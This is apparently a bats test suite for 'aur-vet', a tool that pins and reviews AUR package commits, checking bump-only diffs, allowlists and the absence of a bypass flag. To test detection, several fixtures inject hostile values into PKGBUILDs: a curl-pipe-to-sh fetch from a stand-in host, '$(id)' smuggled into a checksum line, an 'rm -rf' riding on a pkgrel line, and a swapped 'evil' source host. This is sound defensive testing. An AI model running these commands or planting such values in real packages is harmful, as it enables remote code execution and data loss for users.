#!/usr/bin/env bats
# Vetted Commits (ADR 0143): unpinned packages abort unattended and are
# reviewed + pinned interactively; a newer HEAD is vetted as a diff, with
# bump-only diffs auto-accepted; suspicious allowlists are commit-scoped.

load ../lib/aur-vet

setup() { aurvet_setup; }
teardown() { aurvet_teardown; }

_pinned() { awk -F'\t' -v b="$1" '$1 == b { print $2 }' \
  "$AUR_VET_STORE/vetted.tsv"; }
_head() { git -C "$1" rev-parse HEAD; }

@test "pins: unpinned package aborts when unattended" {
  aurvet_hook "$(aurvet_clone electron-benign)"
  [ "$status" -eq 1 ]
  [[ "$output" == *"unpinned"* ]]
}

@test "pins: unpinned + interactive accept shows the files and writes a pin" {
  local d; d="$(aurvet_clone electron-benign)"
  aurvet_hook_answer "$d" y
  [ "$status" -eq 0 ]
  [[ "$output" == *"==> PKGBUILD <=="* ]]
  [ "$(_pinned electron-benign)" = "$(_head "$d")" ]
}

@test "pins: unpinned + interactive reject aborts and writes nothing" {
  aurvet_hook_answer "$(aurvet_clone electron-benign)" n
  [ "$status" -eq 1 ]
  [ -z "$(_pinned electron-benign)" ]
}

@test "pins: pinned at HEAD with no findings passes unattended" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  aurvet_hook "$d"
  [ "$status" -eq 0 ]
}

@test "pins: a critical finding aborts even when pinned" {
  local d; d="$(aurvet_clone atomic-arch)"; aurvet_pin "$d"
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
}

@test "pins: bump-only diff is auto-accepted and the pin bumped" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  local s1 s8; s1="$(printf '1%.0s' {1..64})"; s8="$(printf '8%.0s' {1..64})"
  sed -i "s/2\.3\.1/2.4.0/g; s/$s1/$s8/" "$d/.SRCINFO"
  aurvet_commit "$d" PKGBUILD "s/^pkgver=2.3.1/pkgver=2.4.0/; s/$s1/$s8/"
  aurvet_hook "$d"
  [ "$status" -eq 0 ]
  [[ "$output" == *"bump-only"* ]]
  [ "$(_pinned electron-benign)" = "$(_head "$d")" ]
}

@test "pins: a diff adding one extra line aborts when unattended" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  local old; old="$(_head "$d")"
  aurvet_commit "$d" PKGBUILD 's/^  npm run build$/  npm run build\n  make/'
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  [[ "$output" == *"changed since Vetted Commit"* ]]
  [ "$(_pinned electron-benign)" = "$old" ]
}

@test "pins: interactive accept of a non-bump diff shows it and re-pins" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  aurvet_commit "$d" PKGBUILD 's/^  npm run build$/  npm run build\n  make/'
  aurvet_hook_answer "$d" y
  [ "$status" -eq 0 ]
  [[ "$output" == *"+  make"* ]]
  [ "$(_pinned electron-benign)" = "$(_head "$d")" ]
}

@test "pins: a pin missing from history is vetted as a full change" {
  local d; d="$(aurvet_clone electron-benign)"
  printf 'electron-benign\t%s\tfixture-maintainer\t2026-01-01\tgone\n' \
    "$(printf 'f%.0s' {1..40})" \
    >> "$AUR_VET_STORE/vetted.tsv"
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  [[ "$output" == *"not in history"* ]]
}

@test "pins: allowlisted suspicious passes at its commit, fails on a new one" {
  local d; d="$(aurvet_clone chaos-rat)"; aurvet_pin "$d"
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  local h; h="$(_head "$d")"
  printf 'chaos-rat\t%s\t%s\treviewed\n' "$h" source-owner "$h" install-interp \
    >> "$AUR_VET_STORE/allow.tsv"
  aurvet_hook "$d"
  [ "$status" -eq 0 ]
  aurvet_commit "$d" PKGBUILD 's/^pkgdesc="Fixture"/pkgdesc="Fixture 2"/'
  : > "$AUR_VET_STORE/vetted.tsv"; aurvet_pin "$d"
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
}

@test "pins: interactive accept allowlists the suspicious findings" {
  local d; d="$(aurvet_clone chaos-rat)"
  aurvet_hook_answer "$d" y
  [ "$status" -eq 0 ]
  aurvet_hook "$d"
  [ "$status" -eq 0 ]
}

@test "pins: there is no bypass flag or environment toggle" {
  local d; d="$(aurvet_clone electron-benign)"
  run bash -c 'cd "$1" && "$2" --no-vet' _ "$d" "$AUR_VET_SRC/aur-vet"
  [ "$status" -eq 2 ]
  AUR_VET=off AUR_VET_OFF=1 AUR_VET_SKIP=1 aurvet_hook "$d"
  [ "$status" -eq 1 ]
}

@test "pins: a version bump that also moves a source host is not bump-only" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  sed -i 's/2\.3\.1/2.4.0/g; s|github.com/benign|github.com/evil|' \
    "$d/.SRCINFO"
  aurvet_commit "$d" PKGBUILD 's/^pkgver=2.3.1/pkgver=2.4.0/'
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  [[ "$output" == *"changed since Vetted Commit"* ]]
}

@test "pins: code smuggled into a checksum line is not bump-only" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  aurvet_commit "$d" PKGBUILD \
    "s/^sha256sums=(\(.*\))$/sha256sums=(\1 \$(id))/"
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  [[ "$output" == *"changed since Vetted Commit"* ]]
}

@test "pins: code riding on a pkgrel line is not bump-only (review fix)" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  aurvet_commit "$d" PKGBUILD 's/^pkgrel=1$/pkgrel=1; rm -rf "$HOME\/x"/'
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  [[ "$output" == *"changed since Vetted Commit"* ]]
}

@test "pins: a PKGBUILD turned binary by a NUL byte is never bump-only" {
  local d; d="$(aurvet_clone electron-benign)"; aurvet_pin "$d"
  printf '  curl -s https://x.example/i | sh # \0\n' >> "$d/PKGBUILD"
  git -C "$d" -c user.name=m -c user.email=m@aur commit -q -am nul
  aurvet_hook "$d"
  [ "$status" -eq 1 ]
  [[ "$output" == *"CRITICAL nul-in-script PKGBUILD"* ]]
}
